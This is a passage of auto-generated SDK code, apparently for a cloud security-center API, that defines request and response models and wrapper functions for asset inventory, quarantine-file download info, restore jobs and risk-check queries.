  uuid?: string(name='Uuid'),
}

model DescribePropertySoftwareDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp'),
      installTime?: string(name='InstallTime'),
      installTimeDt?: long(name='InstallTimeDt'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      name?: string(name='Name'),
      path?: string(name='Path'),
      uuid?: string(name='Uuid'),
      version?: string(name='Version'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertySoftwareDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareDetailResponseBody(name='body'),
}

async function describePropertySoftwareDetailWithOptions(request: DescribePropertySoftwareDetailRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.installTimeEnd)) {
    query['InstallTimeEnd'] = request.installTimeEnd;
  }
  if (!Util.isUnset(request.installTimeStart)) {
    query['InstallTimeStart'] = request.installTimeStart;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.softwareVersion)) {
    query['SoftwareVersion'] = request.softwareVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertySoftwareDetail(request: DescribePropertySoftwareDetailRequest): DescribePropertySoftwareDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareDetailWithOptions(request, runtime);
}

model DescribePropertySoftwareItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
}

model DescribePropertySoftwareItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      name?: string(name='Name'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertySoftwareItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareItemResponseBody(name='body'),
}

async function describePropertySoftwareItemWithOptions(request: DescribePropertySoftwareItemRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertySoftwareItem(request: DescribePropertySoftwareItemRequest): DescribePropertySoftwareItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareItemWithOptions(request, runtime);
}

model DescribePropertyTypeScaItemRequest {
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
}

model DescribePropertyTypeScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyTypeItems?: [ 
    {
      name?: string(name='Name'),
      type?: string(name='Type'),
    }
  ](name='PropertyTypeItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyTypeScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyTypeScaItemResponseBody(name='body'),
}

async function describePropertyTypeScaItemWithOptions(request: DescribePropertyTypeScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyTypeScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyTypeScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyTypeScaItem(request: DescribePropertyTypeScaItemRequest): DescribePropertyTypeScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyTypeScaItemWithOptions(request, runtime);
}

model DescribePropertyUsageNewestRequest {
  type?: string(name='Type'),
}

model DescribePropertyUsageNewestResponseBody = {
  itemCount?: int32(name='ItemCount'),
  newestStatisticItems?: [ 
    {
      create?: long(name='Create'),
      name?: string(name='Name'),
    }
  ](name='NewestStatisticItems'),
  requestId?: string(name='RequestId'),
  type?: string(name='Type'),
}

model DescribePropertyUsageNewestResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUsageNewestResponseBody(name='body'),
}

async function describePropertyUsageNewestWithOptions(request: DescribePropertyUsageNewestRequest, runtime: Util.RuntimeOptions): DescribePropertyUsageNewestResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUsageNewest',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUsageNewest(request: DescribePropertyUsageNewestRequest): DescribePropertyUsageNewestResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUsageNewestWithOptions(request, runtime);
}

model DescribePropertyUserDetailRequest {
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  isRoot?: string(name='IsRoot'),
  lastLoginTimeEnd?: long(name='LastLoginTimeEnd'),
  lastLoginTimeStart?: long(name='LastLoginTimeStart'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  user?: string(name='User'),
  uuid?: string(name='Uuid'),
}

model DescribePropertyUserDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      accountsExpirationDate?: string(name='AccountsExpirationDate'),
      createTimestamp?: long(name='CreateTimestamp'),
      groupNames?: [ string ](name='GroupNames'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      isCouldLogin?: int32(name='IsCouldLogin'),
      isPasswdExpired?: int32(name='IsPasswdExpired'),
      isPasswdLocked?: int32(name='IsPasswdLocked'),
      isRoot?: string(name='IsRoot'),
      isSudoer?: int32(name='IsSudoer'),
      isUserExpired?: int32(name='IsUserExpired'),
      lastLoginIp?: string(name='LastLoginIp'),
      lastLoginTime?: string(name='LastLoginTime'),
      lastLoginTimeDt?: long(name='LastLoginTimeDt'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp'),
      passwordExpirationDate?: string(name='PasswordExpirationDate'),
      status?: string(name='Status'),
      user?: string(name='User'),
      uuid?: string(name='Uuid'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyUserDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserDetailResponseBody(name='body'),
}

async function describePropertyUserDetailWithOptions(request: DescribePropertyUserDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyUserDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.isRoot)) {
    query['IsRoot'] = request.isRoot;
  }
  if (!Util.isUnset(request.lastLoginTimeEnd)) {
    query['LastLoginTimeEnd'] = request.lastLoginTimeEnd;
  }
  if (!Util.isUnset(request.lastLoginTimeStart)) {
    query['LastLoginTimeStart'] = request.lastLoginTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUserDetail(request: DescribePropertyUserDetailRequest): DescribePropertyUserDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserDetailWithOptions(request, runtime);
}

model DescribePropertyUserItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  pageSize?: int32(name='PageSize'),
  user?: string(name='User'),
}

model DescribePropertyUserItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      user?: string(name='User'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyUserItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserItemResponseBody(name='body'),
}

async function describePropertyUserItemWithOptions(request: DescribePropertyUserItemRequest, runtime: Util.RuntimeOptions): DescribePropertyUserItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUserItem(request: DescribePropertyUserItemRequest): DescribePropertyUserItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserItemWithOptions(request, runtime);
}

model DescribeQuaraFileDownloadInfoRequest {
  from?: string(name='From'),
  quaraFileId?: int32(name='QuaraFileId'),
}

model DescribeQuaraFileDownloadInfoResponseBody = {
  downloadUrl?: string(name='DownloadUrl'),
  md5?: string(name='Md5'),
  path?: string(name='Path'),
  quaraFileId?: int32(name='QuaraFileId'),
  requestId?: string(name='RequestId'),
  tag?: string(name='Tag'),
  uuid?: string(name='Uuid'),
}

model DescribeQuaraFileDownloadInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeQuaraFileDownloadInfoResponseBody(name='body'),
}

async function describeQuaraFileDownloadInfoWithOptions(request: DescribeQuaraFileDownloadInfoRequest, runtime: Util.RuntimeOptions): DescribeQuaraFileDownloadInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeQuaraFileDownloadInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeQuaraFileDownloadInfo(request: DescribeQuaraFileDownloadInfoRequest): DescribeQuaraFileDownloadInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeQuaraFileDownloadInfoWithOptions(request, runtime);
}

model DescribeRestoreJobsRequest {
  currentPage?: int32(name='CurrentPage'),
  machineRemark?: string(name='MachineRemark'),
  pageSize?: int32(name='PageSize'),
  status?: string(name='Status'),
}

model DescribeRestoreJobsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  restoreJobs?: [ 
    {
      actualBytes?: long(name='ActualBytes'),
      bytesDone?: long(name='BytesDone'),
      bytesTotal?: long(name='BytesTotal'),
      clientId?: string(name='ClientId'),
      completeTime?: long(name='CompleteTime'),
      createdTime?: long(name='CreatedTime'),
      duration?: long(name='Duration'),
      errorCount?: long(name='ErrorCount'),
      errorFile?: string(name='ErrorFile'),
      errorFileUrl?: string(name='ErrorFileUrl'),
      errorType?: string(name='ErrorType'),
      eta?: long(name='Eta'),
      excludes?: string(name='Excludes'),
      exitCode?: string(name='ExitCode'),
      gmtCreate?: string(name='GmtCreate'),
      gmtModified?: string(name='GmtModified'),
      includes?: string(name='Includes'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      itemsDone?: long(name='ItemsDone'),
      itemsTotal?: long(name='ItemsTotal'),
      message?: string(name='Message'),
      percentage?: int32(name='Percentage'),
      requestId?: string(name='RequestId'),
      restoreId?: string(name='RestoreId'),
      restoreName?: string(name='RestoreName'),
      restoreType?: string(name='RestoreType'),
      snapshotHash?: string(name='SnapshotHash'),
      snapshotId?: string(name='SnapshotId'),
      snapshotVersion?: string(name='SnapshotVersion'),
      source?: string(name='Source'),
      sourceClientId?: string(name='SourceClientId'),
      speed?: long(name='Speed'),
      status?: string(name='Status'),
      target?: string(name='Target'),
      updatedTime?: long(name='UpdatedTime'),
      uuid?: string(name='Uuid'),
      vaultId?: string(name='VaultId'),
    }
  ](name='RestoreJobs'),
}

model DescribeRestoreJobsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestoreJobsResponseBody(name='body'),
}

async function describeRestoreJobsWithOptions(request: DescribeRestoreJobsRequest, runtime: Util.RuntimeOptions): DescribeRestoreJobsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestoreJobs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRestoreJobs(request: DescribeRestoreJobsRequest): DescribeRestoreJobsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestoreJobsWithOptions(request, runtime);
}

model DescribeRestorePlansRequest {
  currentPage?: int32(name='CurrentPage'),
  instanceName?: string(name='InstanceName'),
  pageSize?: int32(name='PageSize'),
  status?: string(name='Status'),
}

model DescribeRestorePlansResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  restorePlans?: [ 
    {
      createdTime?: long(name='CreatedTime'),
      databaseName?: string(name='DatabaseName'),
      instanceName?: string(name='InstanceName'),
      policyId?: long(name='PolicyId'),
      policyName?: string(name='PolicyName'),
      restorePoint?: long(name='RestorePoint'),
      status?: string(name='Status'),
      targetDatabaseName?: string(name='TargetDatabaseName'),
      targetInstanceId?: string(name='TargetInstanceId'),
      targetInstanceName?: string(name='TargetInstanceName'),
      updatedTime?: long(name='UpdatedTime'),
    }
  ](name='RestorePlans'),
}

model DescribeRestorePlansResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestorePlansResponseBody(name='body'),
}

async function describeRestorePlansWithOptions(request: DescribeRestorePlansRequest, runtime: Util.RuntimeOptions): DescribeRestorePlansResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestorePlans',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRestorePlans(request: DescribeRestorePlansRequest): DescribeRestorePlansResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestorePlansWithOptions(request, runtime);
}

model DescribeRiskCheckItemResultRequest {
  currentPage?: int32(name='CurrentPage'),
  itemId?: long(name='ItemId'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeRiskCheckItemResultResponseBody = {
  pageContentResource?: {
    contentResource?: map[string]any(name='ContentResource'),
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageCount?: int32(name='PageCount'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageContentResource'),
  requestId?: string(name='RequestId'),
}

model DescribeRiskCheckItemResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckItemResultResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckItemResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResultWithOptions(request: DescribeRiskCheckItemResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckItemResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckItemResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckItemResultRequest
  * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResult(request: DescribeRiskCheckItemResultRequest): DescribeRiskCheckItemResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckItemResultWithOptions(request, runtime);
}

model DescribeRiskCheckResultRequest {
  assetType?: string(name='AssetType'),
  currentPage?: int32(name='CurrentPage'),
  groupId?: long(name='GroupId'),
  itemIds?: [ string ](name='ItemIds'),
  lang?: string(name='Lang'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
  queryFlag?: string(name='QueryFlag'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  riskLevel?: string(name='RiskLevel'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
}

model DescribeRiskCheckResultResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      affectedCount?: int32(name='AffectedCount'),
      checkTime?: long(name='CheckTime'),
      itemId?: long(name='ItemId'),
      remainingTime?: int32(name='RemainingTime'),
      repairStatus?: string(name='RepairStatus'),
      riskAssertType?: string(name='RiskAssertType'),
      riskItemResources?: [ 
        {
          contentResource?: map[string]any(name='ContentResource'),
          resourceName?: string(name='ResourceName'),
        }
      ](name='RiskItemResources'),
      riskLevel?: string(name='RiskLevel'),
      sort?: int32(name='Sort'),
      startStatus?: string(name='StartStatus'),
      status?: string(name='Status'),
      taskId?: long(name='TaskId'),
      title?: string(name='Title'),
      type?: string(name='Type'),
    }
  ](name='List'),
  pageCount?: int32(name='PageCount'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeRiskCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResultWithOptions(request: DescribeRiskCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryFlag)) {
    query['QueryFlag'] = request.queryFlag;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckResultRequest
  * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResult(request: DescribeRiskCheckResultRequest): DescribeRiskCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckResultWithOptions(request, runtime);
}

model DescribeRiskCheckSummaryRequest {
  lang?: string(name='Lang'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeRiskCheckSummaryResponseBody = {
  requestId?: string(name='RequestId'),
  riskCheckSummary?: {
    affectedAssetCount?: int32(name='AffectedAssetCount'),
    disabledRiskCount?: int32(name='DisabledRiskCount'),
    enabledRiskCount?: int32(name='EnabledRiskCount'),
    groups?: [ 
      {
        countByStatus?: [ 
          {
            count?: int32(name='Count'),
            status?: string(name='Status'),
          }
        ](name='CountByStatus'),
        id?: long(name='Id'),
        remainingTime?: int32(name='RemainingTime'),
        sort?: int32(name='Sort'),
        status?: string(name='Status'),
        title?: string(name='Title'),
      }
    ](name='Groups'),
    itemCount?: int32(name='ItemCount'),
    previousCount?: int32(name='PreviousCount'),
    previousTime?: long(name='PreviousTime'),
    riskCount?: int32(name='RiskCount'),
    riskLevelCount?: [ 
      {
        count?: int32(name='Count'),
        key?: string(name='Key'),
      }
    ](name='RiskLevelCount'),
    riskRate?: float(name='RiskRate'),
  }(name='RiskCheckSummary'),
}

model DescribeRiskCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckSummaryResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckSummaryRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummaryWithOptions(request: DescribeRiskCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckSummaryRequest
  * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummary(request: DescribeRiskCheckSummaryRequest): DescribeRiskCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckSummaryWithOptions(request, runtime);
}

model DescribeRiskItemTypeRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeRiskItemTypeResponseBody = {
  list?: [ 
    {
      id?: long(name='Id'),
      title?: string(name='Title'),
    }
  ](name='List'),
  requestId?: string(name='RequestId'),
}

model DescribeRiskItemTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskItemTypeResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskItemTypeRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemTypeWithOptions(request: DescribeRiskItemTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskItemTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
